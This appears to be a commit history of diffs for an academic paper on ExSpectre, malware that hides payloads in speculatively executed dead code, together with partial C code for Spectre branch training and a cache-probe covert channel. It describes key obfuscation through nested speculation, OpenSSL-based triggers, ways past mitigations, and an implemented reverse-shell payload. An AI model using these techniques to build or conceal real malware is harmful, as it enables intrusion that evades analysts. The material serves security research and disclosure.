+decrypt messages. However, the speculative upper-limit of about 175 $\mu$~ops is not
 enough to allow us to compute the key expansion, even using the
-\texttt{aeskeygenassist} instructions. To avoid this, we preload the expanded
-key schedule into the program, rather than the key. We note that an analyst
+\texttt{aeskeygenassist} instructions. To avoid this, we can either preload the
+expanded key schedule into the program (instead of the key), or use a cheaper
+(non-standard) key expansion algorithm.
+For the former, we note that an analyst
 could observe the structure of a normal key schedule,
 but we can avoid this by simply selecting 11 random round keys.
-While this alternative key schedule variant is not ``true'' AES, we can easily
-make the same change in our respective encryption function to make it compatible.
 We note that
@@
 not linearly related.
-We discuss further methods for obfuscating
-the key in Section~\ref{subsec:nested-spec}.
+
+%We discuss further methods for obfuscating
+%the key in Section~\ref{subsec:nested-spec}.
+%
 
@@
 
+% TODO: this could move elsewhere?
 We demonstrate the speed that information can be decrypted via the speculative
@@
 
-\subsubsection{Obfuscating keys with nested speculation}
-\label{subsec:nested-spec}
-
-An analyst could locate the speculative entry point for our
-decryption gadget by
-searching for AES-NI instructions in the payload program's dead code, ultimately
-discovering the keys that it uses. However, we find it is possible to overcome
-this by having the trigger program communicate the decryption key to the payload
-program via the branch predictor.
-
-To accomplish this, we use multiple speculative entry points, each that derives a
-different decryption key before calling a common decryption routine. Since
-the exact speculative entry point is determined by the trigger program, an
-analyst cannot discover the decryption key directly from the payload program.
-
-An analyst could still enumerate all potential entry points, testing each one
-until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
-there are (at most) only 1~million entry points, providing just 20~bits of
-security.
-
-To increase security, we instead use nested speculation to \emph{chain} entry points
-together. Rather than derive
-the key from a single entry point, we have each potential entry point perform
-another indirect jump that the CPU cannot immediately resolve, forcing it to
-speculate while already executing speculatively. The predicted target of that jump
-will also be determined by the trigger program. For example, if the trigger
-program makes 30 training jumps, followed by 10 additional indirect jumps, and
-the payload program performs the same 30 training jumps before a stall, the CPU
-will predict the payload program will also perform the next 10 jumps. If each
-jump has the potential to land in up to 1024 possible locations, this would
-provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
-%We describe our implementation of this nested speculative execution concept in
-%Section~\ref{subsec:nested-spec}.
-
 \smallskip
 
-We implemented this technique, making 256 speculative landing spots, that each
-shifted 8 unique bits into the 128-bit register \texttt{\%xmm0}, and then
-performed an indirect jump. We then had the trigger program perform 16
-indirect jumps that corresponded with 16 randomly-chosen landing spots in the
+We also implemented our nested speculation technique for obfuscating keys,
+making 256 speculative landing spots that each
+shift 8 unique bits into the 128-bit register \texttt{\%xmm0}, and then
+performing an indirect jump. We then had a custom trigger program perform 16
+indirect jumps (after the initial 28) that corresponded with 16 randomly-chosen landing spots in the
 payload program, training the branch predictor. When the payload program reaches the
@@
 the \texttt{aesenc} instruction to expand these 128-bits to a full
-key schedule, and performed decryption as described previously.
+key schedule, and performed decryption as described previously. Thus, without
+the trigger program, an analyst has no information about what key is used to
+decrypt the ciphertext in the payload.
 
@@
 
+% TODO: needs a pass
 %Constructing an emulator making use of the speculative primitive requires  

### 2018-08-03 paper/payloads.tex
pass on implementation/payload reording

@@
 
+\subsubsection{Obfuscating keys with nested speculation}
+\label{subsec:nested-spec}
+
+%TODO: ewust needs a pass to tie into previous section
+An analyst could locate the speculative entry point for our
+decryption gadget by
+searching for AES-NI instructions in the payload program's dead code, ultimately
+discovering the keys that it uses. However, we find it is possible to overcome
+this by having the trigger program communicate the decryption key to the payload
+program via the branch predictor.
+
+To accomplish this, we use multiple speculative entry points, each that derives a
+different decryption key before calling a common decryption routine. Since
+the exact speculative entry point is determined by the trigger program, an
+analyst cannot discover the decryption key directly from the payload program.
+
+An analyst could still enumerate all potential entry points, testing each one
+until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
+there are (at most) only 1~million entry points, providing just 20~bits of
+security.
+
+To increase security, we instead use nested speculation to \emph{chain} entry points
+together. Rather than derive
+the key from a single entry point, we have each potential entry point perform
+another indirect jump that the CPU cannot immediately resolve, forcing it to
+speculate while already executing speculatively. The predicted target of that jump
+will also be determined by the trigger program. For example, if the trigger
+program makes 30 training jumps, followed by 10 additional indirect jumps, and
+the payload program performs the same 30 training jumps before a stall, the CPU
+will predict the payload program will also perform the next 10 jumps. If each
+jump has the potential to land in up to 1024 possible locations, this would
+provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
+%We describe our implementation of this nested speculative execution concept in
+%Section~\ref{subsec:nested-spec}.
+
 \medskip

### 2018-08-03 paper/implementation.tex
add values

@@
 
-%TODO: Ian please fill in these numbers
 Instead, we
@@
 million Turing steps, with the error rate dropping exponentially as iterations
-increase. We choose TODO(Ian) iterations as a conservative bound (error rate measured
-to be 0), and computed 1 million Turing steps at a rate of TODO(Ian)
+increase. We choose 11 iterations as a conservative bound (error rate measured
+to be 0), and computed 1 million Turing steps at a rate of 1351.75
 steps per second.

### 2018-08-03 spectre_1/train/measure_fn.c
Testing training round requirements.

@@ -1,0 +1,212 @@
+#include <stdio.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "signal.h"
+
+
+#define MAX_ITERATIONS 2000
+
+/*
+ * Target gadget  never called directly (essentially dead code)
+ * However, "inject" (ideally) trains the processor to think the indirect ret in the
+ * retpoline in measure is going to call this function
+ */
+#define TARGET_FN_ADDR 0x414100401000
+void target_fn(void) __attribute__((section(".targetfn")));
+void end_target_fn(void);
+
+
+/*
+ * Defines the bandwidth we can communicate from speculative -> von neuman
+ * e.g. 256 would be 1 byte of info Tradeoff here is larger bandwidth means 
+ * we have to check more places in probe_buf (and flush them)
+ */
+//#define NUM_PROBES 256
+
+/*
+ * These define the stride length we take between probes. This thwarts a 
+ * clever CPU's stride prediction (e.g. "you loaded buf[0], buf[1024], 
+ * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
+ * winning probes in which case, we change cur_probe_space and retry.
+ */
+#define MAX_PROBE_SPACE (10003)
+
+/*
+ * The (heap-allocated) probe buffer
+ * We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+ * in the cache to communicate the value i from speculative -> von neuman
+ */
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+
+static inline __attribute__((always_inline)) void flush_probe_buf_i(){
+    // Clear probe_buf from cache
+    int j =0;
+    for (j=0; j<NUM_PROBES; j++) {
+        _mm_clflush(&probe_buf[j*cur_probe_space]);
+    }
+}
+
+void flush_probe_buf(){
+    // Clear probe_buf from cache
+	flush_probe_buf_i();
+}
+
+
+// Stats
+uint64_t cache_hits;    /* Number cache hits (<140 cycles read) */
+uint64_t tot_runs;      /* Number of trials (i.e. 10k) */
[…]

### 2018-08-03 spectre_1/train/signal.h

@@ -1,0 +1,41 @@
+#include <stdint.h>
+#include <stdbool.h>
+#include "stringify.h"
+
+
+#define __SIGNAL(val, reg1, reg2, reg3)     \
+        movq $(val), reg2;                     \
+        mov (cur_probe_space), reg1;        \
+        imul reg1, reg2;                          \
+        mov (probe_buf), reg3;              \
+        add reg2, reg3;                     \
+        mov (reg3), reg1;
+
+#define __signal(value) \
+        __stringify(__SIGNAL(value, %%rax, %%rcx, %%rdx))
+
+extern uint8_t* probe_buf;
+extern uint64_t cur_probe_space;
+#define NUM_PROBES 256
+
+/*
+ * Find the K items in results that have been hit the most often
+ */
+bool get_top_k(uint64_t k, uint64_t* results, uint64_t* output_i, uint64_t* output_res, 
+               const int MAX_ITERATIONS, const int TRAINING_ROUNDS);
+
+/*
+ * Signal32 will use a bitmask on the upper part of each item in the 
+ * Top-K items to identify where it goes in the final result. This 
+ * reconstructs that result by identifying the bitmasks.
+ */
+uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k);
+
+
+void signal(uint64_t state);
+
+void signal32(uint32_t state);
+
+void signal40(uint64_t state);
+
+

### 2018-08-03 spectre_1/train/target_fn.c

@@ -1,0 +1,25 @@
+#include <unistd.h>
+#include <stdint.h>
+#include <stdio.h>
+#include "signal.h"
+
+extern uint8_t *probe_buf;
+extern uint64_t cur_probe_space;
+extern uint64_t signal_idx;
+
+uint64_t try_decrypt(void);
+__uint128_t aes_ctr(uint64_t ctr);
+
+extern uint8_t *turing_tape;
+extern uint8_t turing_state;
+
+void target_fn(void) __attribute__((section(".targetfn")));
+void target_fn(void)
+{
+    asm volatile ( __signal(0x11) :::"rax", "rcx", "rdx");
+}
+
+void end_target_fn(void) __attribute__((section(".targetfn")));
+void end_target_fn(void) {
+}
+

### 2018-08-03 paper/payloads.tex
flow pass on intro to triggers

@@
 
-%TODO: ewust needs a pass to tie into previous section
-An analyst could locate the speculative entry point for our
-decryption gadget by
-searching for AES-NI instructions in the payload program's dead code, ultimately
-discovering the keys that it uses. However, we find it is possible to overcome
+As mentioned, even with encryption, an analyst that can locate the
+speculative entry point and discover the decryption key. For instance, the
+analyst could locate the speculative entry point by searching for AES-NI
+instructions in the payload program, ultimately discovering the keys it derives
+and uses.
+
+We can overcome
 this by having the trigger program communicate the decryption key to the payload
-program via the branch predictor.
-
-To accomplish this, we use multiple speculative entry points, each that derives a
+program via the branch predictor. To accomplish this, we use multiple speculative
+entry points, each that derives a
 different decryption key before calling a common decryption routine. Since
@@
 
-An analyst could still enumerate all potential entry points, testing each one
+Still, an analyst could enumerate all potential entry points, testing each one
 until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
 there are (at most) only 1~million entry points, providing just 20~bits of
-security.
+security, trivial for an analyst to brute force.
 
@@
 provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
-%We describe our implementation of this nested speculative execution concept in
+We describe our implementation of nested speculative execution in
+Section~\ref{subsec:impl-aes}, where we achieve 128~bits of security.
 %Section~\ref{subsec:nested-spec}.
@@
 
-\subsection{Virtual Machines}
-We demonstrate in Section~\ref{subsec:turing} that general purpose computation 
-is possible in the speculative environment in spite of the constraints 
-imposed. However, a Turing Machine
-is not an efficient or usable model for computation when
-attempting to accomplish tasks on modern processors.
+\subsection{Emulation}
 
-Using emulators in the ``real world'' allows for binary programs to be
-placed encrypted and hidden in dead code and, as demonstrated in
-Section~\ref{subsec:decryption}.
+To combine our encryption and arbitrary computation in an efficient way, we
+implemented an emulator that gets its instructions from the speculative
+decryption described previously. In the payload program, the emulated
+instructions are initially encrypted under a key that will be delivered by the
+trigger, as described previously. Once the trigger executes, it will cause
+instructions to be decrypted and run by the emulator.
+
 Traditional reverse engineering methods will reveal only that
@@
 Even when the trigger is running, only the parts of the code that execute would
-be revealed to a careful analyst observing the CPU's committed state, and the
+be revealed to a careful analyst observing the CPU's committed state, while the
 remainder of the emulated program would remain hidden.
@@
 We design a custom emulator and instruction set---SPASM (Speculative
-Assembly)---that accommodates the constraints of the speculative primitive.
+Assembly)---that accommodates the constraints of our speculative primitive.
 SPASM is a 6-bit Instruction set, where all instructions (including operand,
@@
 instructions incrementally through the fixed-width channel (e.g. using 4 8-bit
-reads to reveal a single 32-bit ARM instruction).
-This would allow for encrypted payloads to be written in higher level languages
-like C or C++, and compiled to any target architecture the real-world emulator
-can execute.
+reads to reveal a single 32-bit ARM instruction), allowing for encrypted
+payloads to be written in higher-level languages. We also note that this
+provides flexibility to the authors, allowing them to completely redefine
+instructions or use a different instruction set altogether to hamper detection.

### 2018-08-03 paper/triggers.tex
flow pass on intro to triggers

@@
 So far, we have described using a custom program as a trigger, which performs a
-pattern of indirect jumps to mistrain the indirect branch predictor. In this
+pattern of indirect jumps to mistrain the indirect branch predictor, leading the payload program
+to its speculative entry point. In this
 section, we describe alternative triggers, including using benign programs

### 2018-08-03 paper/implementation.tex
impl pass

@@
 increase. We choose 11 iterations as a conservative bound (error rate measured
-to be 0), and computed 1 million Turing steps at a rate of 1351.75
+to be 0), and computed 1 million Turing steps at a rate of 1351
 steps per second.
@@
 
-% TODO: needs a pass
 %Constructing an emulator making use of the speculative primitive requires  
@@
 only when the corresponding trigger program is running.
-We first implemented a \textit{HelloWorld}
-program that prints to \texttt{stdout}. Next, a \texttt{FizzBuzz} program that
+We have implemented a \textit{HelloWorld}
+program that prints to \texttt{stdout}, and a \texttt{FizzBuzz} program that
 demonstrates control flow and arithmetic operations while printing to stdout.
-Finally, we implemented a \textit{ReverseShell} program that opens and connects to a socket
-before duplicating I/O file descriptors and executing a local shell.
+Finally, we implemented a \textit{ReverseShell} program that opens and connects a TCP socket
+to an attacker-chosen location
+before executing a local shell and allowing the remote adversary
+to issue shell commands on the victim machine.
 Figure~\ref{fig:spasm_model} details the high-level flow of a SPASM payload.
@@
 % Could cut?
-For these experiments, we disable
+We disable
 ASLR for simplification, but note that
@@
 and 28,000 indirect jumps. We then searched for the longest repeated set of more than
-28 indirect jumps that end with a unique jump (i.e. source and destination do
+28 indirect jumps that ends with a unique jump (i.e. source and destination do
 not occur in the previous 28+ indirect jumps).
@@
 We discovered a candidate that corresponds to code in OpenSSL's
-\texttt{nistp256.c} that contained 31 indirect jumps repeated 254 times in our
+\texttt{nistp256.c} that contained 31 indirect jumps repeated 254 times each
 handshake. This code is used during the TLS key exchange as the server computes
@@
 Apache benchmark to create thousands of connections with a different cipher
-suite (DHE-RSA-AES128-GCM-SHA256), we similarly received no speculation. This
-could allow an adversary to use an obscure or uncommon (but still
-supported) cipher suite to trigger a malicious \speculake payload program on a remote server.
+suite (DHE-RSA-AES128-GCM-SHA256), we similarly saw no speculation at the entry point. This
+could allow an adversary to use an obscure or uncommon cipher suite to trigger a
+malicious \speculake payload program on a remote server.
 

### 2018-08-04 paper/figures.tex
made line plots greyscale friendly
figure updates

@@
 
+\newcommand{\FigSpectreOne}{
+\begin{figure}[t]
+    \centering
+    \includegraphics[width=0.9\linewidth]{figures/spectre_1_training.png}
+    \caption{When using speculative buffer overflow the direct branch predictor
+    must be trained on input data before it can mis-speculate a branch. 
+    Over an independent number of training 
+    rounds we measure the resulting hit rate fraction of trials where the 
+    speculative gadget is able to perform the intended cache load. We find 
+    that around 200 benign training branches are required before a branch 
+    can be mis-speculated with discernable hit rate fraction. Note that a 
+    1\% signal is generally significant enough to discern as background cache noise 
+    is minimal in an ideal scenario.}
+    \label{fig:spectre-one}
+\end{figure}   
+}
+
+\newcommand{\FigSpecMeasureNP}{
+\begin{figure*}[t]
+     \centering
+        \includegraphics[width=0.9\textwidth]{figures/Speculative_measurements_no-parity.png}
+    \caption{The speculative primitive allows for a limited number of instructions
+    to be completed speculatively, dependent on multiple factors. The ROB 
+    capacity aligns directly with the upper bound of nop instructions 
+    that can be completed speculatively, while other constraints bound more 
+    complex instructions.}
+    \label{fig:spec-capacity-np}
+\end{figure*}
+}
+
+\newcommand{\FigSpecMeasureParity}{
+\begin{figure}[b]
+     \centering
+        \includegraphics[width=1.05\linewidth]{figures/Speculative_measurements_parity.png}
+    \caption{Trigger and payload processes must share CPU resources as they 
+        must be performed on the same hyperthread or associated parity hyperthreads. 
+        Processes on the parity hyperthreads (cool colors) denoted by (P) accomplish a 
+        significantly lower number of instructions as compared with processes 
+        on the same hyperthread (warm colors).}
+    \label{fig:spec-capacity-parity}
+\end{figure}
+}
+
 \newcommand{\FigSpecMeasure}{
@@
     \caption{The Cache Hit/Miss Latency Distribution of an Intel
-        Xeon-1270. Measured by timing accesses to cached/uncached memory. 
+        Xeon-1270 and AMD Epyc 7251. Measured by timing accesses to cached/uncached memory. 
         Typical cache miss resolution takes 6x longer than a cache hit.}

### 2018-08-04 paper/related-work.tex

@@
 computation~\cite{weird_machines,bratus2011exploit}. In
-particular \speculake showcases the ability to execute dead code.
+particular \speculake showcases the ability to use CPU speculation to compute.
 
@@
 machines'' include traditional vulnerabilities such as buffer overflows, format
-string exploits and return-to-libc attacks without function
-calls~\cite{buffer_overflow, format_string_exploit, shacham2007geometry}.
-Additionally, unexpected functionality such as instruction-less computing
-enables the demonstration of a Turing complete ``weird machine'' by taking
-advantage of memory translation tables, page-faults, and hardware exception
-handling to effectively compute arithmetic and logical operations without the
-processor executing any instructions~\cite{bangert2013page}.
+string exploits and return oriented
+programming~\cite{buffer_overflow, format_string_exploit, shacham2007geometry}.
+Weird machines have also been built using operating system page faults, enabling
+the computation of arithmetic and logic operations without the use of
+traditional instructions~\cite{bangert2013page}.
+%Additionally, unexpected functionality such as instruction-less computing
+%enables the demonstration of a Turing complete ``weird machine'' by taking
+%advantage of memory translation tables, page-faults, and hardware exception
+%handling to effectively compute arithmetic and logical operations without the
+%processor executing any instructions~\cite{bangert2013page}.
+\speculake extends research in ``weird machines'', and takes advantage of
+speculative execution to execute instructions that otherwise appear to be dead
+code.
 
-\speculake is a new type of ``weird machine'' that takes advantage of
-speculative execution and uses a non-complicit trigger program to execute
-otherwise dead code. While previous ``weird machines'' have demonstrated the
-capability to execute potentially malicious code in an unexpected manner, we are
-the first to exploit speculative execution in order to execute arbitrary
-instructions.
+% Not sure this is true. It could be argued that Spectre is the first to do
+% this, though we certainly leverage that for our purposes. It's a fuzzy
+% distinction, but maybe best to leave this out.
+%While previous weird machines have demonstrated the
+%capability to execute potentially malicious code in an unexpected manner, we are
+%the first to exploit speculative execution in order to execute arbitrary
+%instructions.
 
@@
 
-There is a plethora of previous research into cache side-channels, examining how
-information is leaked between
-processes~\cite{percival2005cache,zhang2012cross,osvik2006cache}. This is a key
-feature of Spectre~\cite{spectre} and Meltdown~\cite{meltdown}. In \speculake we
-use the branch predictor side-channel as a \emph{covert
-channel}~\cite{lampson1973note} between an innocent trigger program and malware.
-This allows \speculake to use the leaked information from cache as a message to
-the malware in order to influence speculative execution pathways.
+Spectre builds upon prior work on cache side channels, and similarly uses to to
+leak information from
+processes~\cite{percival2005cache,zhang2012cross,osvik2006cache}. In \speculake,
+we use the branch predictor as a \emph{covert channel}~\cite{lampson1973note}
+between the trigger program and malware payload, allowing the malware's
+(speculative) execution path to be influenced by the trigger.
 
-Previous work has examined various ways of sharing information over covert
+Previous work has examined how to share information over covert
 channels, such as across virtualized environments on cloud
@@
 information~\cite{percival2005cache}, measuring temperature to create a thermal
-covert channel~\cite{masti2015thermal, bartolini2016capacity} and taking
+covert channel~\cite{masti2015thermal, bartolini2016capacity}, and taking
 advantage of processor architecture to leak information~\cite{wang2006covert}.
+This includes using the branch predictor itself as a covert
+channel~\cite{evtyushkin2016understanding,evtyushkin2015covert}, which
+\speculake similarly uses.
 
-\speculake uses the branch predictor as a covert channel. The branch predictor
-has been considered as a covert channel
-before~\cite{evtyushkin2016understanding}. For example, the branch predictor can
-be used by two colluding programs to share sensitive information between each
-other by timing how long a spy process executes taken (not-taken)
-branches~\cite{evtyushkin2015covert}.
-
-While the branch predictor has been used as a covert channel between two
-colluding malicious programs, \speculake exemplifies a new covert channel using
-the branch predictor in which only one side of the channel is nefarious and the
-other is innocent. \speculake takes advantage of a branch predictor side-channel
-in \texttt{OpenSSL} and uses it as a covert channel. \texttt{OpenSSL} is not a
-malicious colluding program in this case but rather a program whose execution
-pathway can be influenced by attackers based on selected cipher suites. This
-allows malware to use the branch predictor as an attacker controlled covert
-channel between an unsuspecting trigger program and \speculake malware.
+However, we note that the covert channel used in \speculake need not involve two
+cooperative programs, and we demonstrate using the benign OpenSSL as a
+non-colluding program involved in utilizing this covert channel.
 
@@
 \speculake builds on Spectre~\cite{spectre} and Meltdown~\cite{meltdown} which
-leverage speculative execution to leak sensitive information to unprivileged
-processes.  Others have built on Spectre and Meltdown to demonstrate web-based
-vulnerabilities~\cite{genkin2018drive, schwarz2018netspectre} as well as
-hardware isolation leaks in Intel's SGX~\cite{spectre_sgx,chen2018sgxpectre}.
-The branch predictor has also been examined~\cite{evtyushkin2018branchscope} in
-the light of Spectre but only as side-channel which is leaking information.
-\speculake likewise takes advantage of speculative execution however it does so
-to attain hidden arbitrary computation. We believe that \speculake can leverage
-these advances in speculative execution malware as well.
+leverage speculative execution to leak sensitive information from vulnerable
+processes.  Follow up work has identified several new Spectre variants,
+including speculative buffer overflows and speculative store
+bypass~\cite{kiriansky2018speculative,spec-store-bypass}, and has investigated
+additional ways to leak information using branch
+predictors as a side channel~\cite{evtyushkin2018branchscope}.
+Researchers have also leveraged Spectre to demonstrate web-based
+vulnerabilities~\cite{genkin2018drive,schwarz2018netspectre} as well as to leak
+keys and other information from the hardware isolation provided by Intel
+SGX~\cite{spectre_sgx,chen2018sgxpectre,foreshadow}.
+\speculake likewise takes advantage of speculative execution, but with the goal
+of hiding arbitrary computation from reverse engineering, rather than extracting
+secrets from vulnerable programs. \speculake additionally benefits from
+new Spectre variants: as we showed, speculative buffer overflows (``Spectre~1.1'')
+can be used as an alternative trigger for malware.

### 2018-08-04 paper/architecture.tex

@@
 
-\FigSpecMeasure
+\FigSpecMeasureNP
 
@@
 have to wait for the first to return before it can be issued, causing a
-noticeable step increase in the cycle count. Figure~\ref{fig:spec-capacity}
+noticeable step increase in the cycle count. Figure~\ref{fig:spec-capacity-np}
 shows this step occurs at approximately 220 instructions for our processor,
@@
 AES-NI encryption and decryption instructions, which each use 128-bit registers.
-As shown in Figure~\ref{fig:spec-capacity}, speculative environments can
+As shown in Figure~\ref{fig:spec-capacity-np}, speculative environments can
 complete a significant number of AES rounds---over 100 rounds in our
@@
 
+\FigSpecMeasureParity
+
 When running our tests, we assign the payload and trigger program to the same
@@
 number of instructions that can be run in the speculative context.
-Figure~\ref{fig:spec-capacity} shows the instructions that can be run when
+Figure~\ref{fig:spec-capacity-parity} shows the instructions that can be run when
 running trigger and payload on a single core vs.\ a pair of hyperthreaded cores.
@@
 \subsubsection{Nested Speculation}
+\label{sssec:nested-spec}
 
@@
 (which has still not resolved). If the trigger program jumps to C, the payload
-program may speculate a second time and continue speculative execution at C.
+program may speculate a second time and continue speculative execution at~C.
 

### 2018-08-04 paper/triggers.tex
figure updates
discussion pass
Alternative triggers

@@
 
+\FigSpectreOne
+
 In addition to using separate trigger programs, ExSpectre can also use
@@
 While existing fuzzers and symbolic execution tools can discover traditional
-input triggers, we can leverage other Spectre variants...
+input triggers, we can leverage other Spectre variants to obfuscate speculative
+gadget access.
 
-TODO: Jack
+We make use of Specualtive Buffer Overflows (SBO) to redirect control flow
+to a speculative entry point specified by user input. Using Spectre variant 1.1 
+we can design a program that takes seemingly arbitrary user input and performs complete 
+bounds checks such that evaluated code is safe, however a direct branch can
+be bypassed speculatively given significant lead up with consistent input 
+to train the branch predictor (see Figure~\ref{fig:spectre-one}). This allows the input
+to become the trigger.
+
+A direct branch followed by a store operation with user controlled index and
+value can be coerced into overflowing a local array. 
+As seen in code snippet from Kiriansky and Waldspurger~\cite{kiriansky2018speculative}:
+\begin{lstlisting}
+    if (y < lenc)
+        c[y] = z;
+\end{lstlisting}
+with user controlled 
+\texttt{y} and \texttt{z} and sporadically uncached \texttt{lenc}, an attacker 
+can \textit{speculatively} overflow array \texttt{c}
+to overwrite a return address, function pointer, etc. and redirect control flow.
+
+We make use of this in a willing payload such that user input can intentionally 
+mistrain the branch predictor. The speculative entry point is also chosen by the 
+trigger in this scenario as \texttt{z} contains the address of the 
+speculative entry point, allowing the attacker to create a ROP style speculative 
+execution path through the payload.
 
@@
 
-TODO: Jack
+Speculative Store Bypass (SSB) can similarly be used to construct an internal trigger
+using race conditions on a store and a subsequent load that the cpu believes 
+will not alias but in reality do~\cite{spec-store-bypass}.
+
+To redirect control flow a store to a function pointer or indirect branch 
+target pointer could be speculated to a stale value. While the program never 
+executes at this stale address in reality, the speculative gadgets have a 
+real effect on shared resources. This attack again allows ROP style 
+chains to execute speculative gadgets.
+
+The speculative primitive is shared by all versions of Spectre as an upper
+bound on what can be done speculatively. What is required to adapt a spectre 
+vulnerability into the \speculake technique is an attacker controlled method of 
+triggering control flow redirection in a willing payload to a speculative entry point.
 

### 2018-08-04 paper/discussion.tex

@@
 contradictory conditions such that the resulting code section can never 
-be on a real world execution path.
-This, however does not prevent the section from being speculated. An 
-attacker may be able to hide a jump to a speculative entry point in 
-this section and train the branch predictor to take this path.
+be on a real world execution path. This, however does not prevent such a path
+from occuring speculatively. An attacker could use such an impossible path to
+hide speculative logic that influences the malware, effectively obscuring the
+speculative entry point.
+Similarly, the speculative store bypass variant~\cite{spec-store-bypass} could be used to
+redirect control flow when the mis-speculated load is that of an indirect
+branch target or function pointer.
 
-Alternatively, recent variants of Spectre version 1 could be used to
-redirect control flow in speculative overflow style attacks~\cite{}. 
-Using this technique speculative gadgets could be executed
-based on attacker controlled input.
+% we demonstrated this, hopefully
+%Alternatively, recent variants of Spectre version 1 could be used to
+%redirect control flow in speculative overflow style attacks~\cite{kiriansky2018speculative}. 
+%Using this technique speculative gadgets could be executed
+%based on attacker controlled input.
 
-Similarly we theorize that speculative-store-bypass could be used to
-redirect control flow when the mis-speculated load is that of an indirect
-branch target or function pointer. Again the speculative primitive could 
-be employed to execute speculative gadgets.
+%Again the speculative primitive could 
+%be employed to execute speculative gadgets.
 
-These alternatives create an even larger attack area for a potential 
-reverse engineer as the attacker can pivot between them with minimal alterations.
+%These alternatives create an even larger attack area for a potential 
+%reverse engineer as the attacker can pivot between them with minimal alterations.
 
+\if0
+%Cutting this for now. We sort of cover it in the Turing section(s)
 \subsubsection{Gadget Location}
@@
 as executable.
+\fi
 
@@
 hardware resources, \speculake is viable in certain configurations. 
-This result is specific to Spectre version 2 as it relies on 
+This result is specific to Spectre 2 variant, as it relies on 
 the indirect branch predictor effecting the branches in either the host 
@@
 can effect the branch predictor in a host on the same CPU core. This is not
-true in the alternate configuration where the trigger runs on the host as the 
+true in the opposite direction (where the trigger runs on the host) as the 
 hypercall transition seems to be more substantial. This implies, and we have verified,
@@
 \subsubsection{Implemented Mitigations}
-Multiple mitigation have been implemented in production and consumer environments
-already, stretching from compiler patches to micro-code updates.
+Multiple patches and micro-code updates have been developed to mitigate Spectre
+vulnerabilities, however, none of these entirely prevent \speculake malware from
+working, as they are generally not designed to protect programs that willingly use
+Spectre against themselves.
 
-IBPB - IBPB is used when transitioning to a new secure address space allowing a
+\paragraph{Indirect Branch Predictor Barrier} - IBPB is used when transitioning to a new
+address space, allowing a
 program to ensure that earlier code's behavior does not effect its branch prediction.
-However, this does not prevent a willing payload program from intentionally omitting
-IBPB protections.
+IBPB requires CPU and operating system support. However, we observe that
+processes running under the same user group do not receive IBPB protection,
+enabling \speculake when the trigger and payload run under the same group.
+Furthermore, IBPB does not prevent the speculative buffer overflow variant of
+\speculake described in Section~\ref{subsec:spec-buffer-overflow}.
 
-STIBP - As discussed in section~\ref{sssec:hyperthread} Single Thread Indirect Branch Predictors
-prevent sibling threads from interacting via the Indirect Branch Predictor~\cite{}.
-However, this does not prevent coresident processes from cooperating, which is
-guaranteed to eventually occur in most modern operating systems.
+%However, this does not prevent a willing payload program from intentionally omitting
+%IBPB protections.
 
-IBRS - Prevents code from less privileged prediction modes from effecting predicted
-addresses, specifically used for portecting the kernel. This does not
+\paragraph{Single Thread Indirect Branch Predictors} - STIBP prevents sibling
+hyperthreads from interacting via the indirect branch predictor. However, this
+does not prevent co-resident processes from cooperating when they run on the same
+logical core.
+
+\paragraph{Indirect Branch Restricted Speculation} - IBRS prevents code in less
+privileged prediction modes from influencing indirect branch prediction in
+higher privileges (e.g. the kernel). This does not
 prevent speculative execution in a willing payload program in a less privileged
@@
 
-Retpoline - Using speculation to prevent speculation, retpoline is a construction
-used to prevent arbitrary indirect jumps that can be included inline by a compiler
-or patched into a binary~\cite{}. While this successfully thwarts indirect branch prediction
-tampering it incurs a siginificant performance penalty when applied globally to all
-indirect branches~\cite{}.
+\paragraph{Retpoline} is a software mitigation that replaces indirect jumps with
+a special call/overflow/return sequence, controlling where the CPU will
+speculate the indirect branch to a contained (and benign)
+section~\cite{retpoline}. However, this defense is opt-in which \speculake
+binaries could simply choose to not use, or alternatively use the unaffected
+speculative buffer overflow variant.
 
@@
 \label{subsubsec:malware}
-Like Spectre, \speculake relies on a cache side-channel to transfer
-information from the speculative world to the real world. Since the payload
-program must at least occasionally watch this side channel, it offers a
+While not a primary goal of \speculake, we consider the ability of \speculake
+malware to hide from detection.
+
+When using the cache side channel variant of \speculake, the payload
+program must at least occasionally watch this side channel, offering a
 potential method for detecting \speculake malware.
-
 Analysts could search for telltale signs of cache inference behavior, such as
-the use of \texttt{clflush} instructions or reading cycle timings. However,
-while this would allow detection of \speculake malware, it does not directly
-help in reverse engineering the malware's behavior. We also note that our
-implementation of \speculake used the \texttt{Flush+Reload} cache side channel
-method, but other methods (such as \texttt{Prime+Probe}) could be used in its
-place.
-
-In addition, the malware can also employ more subtle and less direct methods
-of measuring what is in the cache. For example, creating race conditions between
-multiple threads that results in different behaviors depending on which threads
-values are cached.
+the use of \texttt{clflush} instructions or reading cycle timings. At the cost
+of performance, \speculake could choose to use a more subtle cache side channel
+that does not require this, such as \texttt{Prime+Probe}, or by exploiting race
+conditions between multiple threads to allow the speculative world to influence
+the behavior of the real world.
 
@@
 
-\paragraph{Red-Pills}
-Hardware minutia have also been used to identify and fingerprint execution
-environments---in malware this is known as a red-pill~\cite{red-pill} and is
-typically used by malware to detect when it is under emulation or a debugging
-environment~\cite{lindorfer2011detecting, balzarotti2010efficient,
-paleari2009fistful} attempting to circumvent malware detectors. To address
-red-pills, systems often employ measures to detect them. ``Bare-metal''
-emulation of malware~\cite{kirat2011barebox}, methods to determine if malware is
-performing red-pill checks to avoid emulation
-environments~\cite{kirat2014barecloud}, and symbolic execution can be used to
-combat red-pills by finding environmental triggers in malicious
-binaries~\cite{schwartz2010all}. Similar sand-boxing techniques may be applied
-to detect \speculake malware.
+%\paragraph{Red-Pills}
+%Hardware minutia have also been used to identify and fingerprint execution
+%environments---in malware this is known as a red-pill~\cite{red-pill} and is
+%typically used by malware to detect when it is under emulation or a debugging
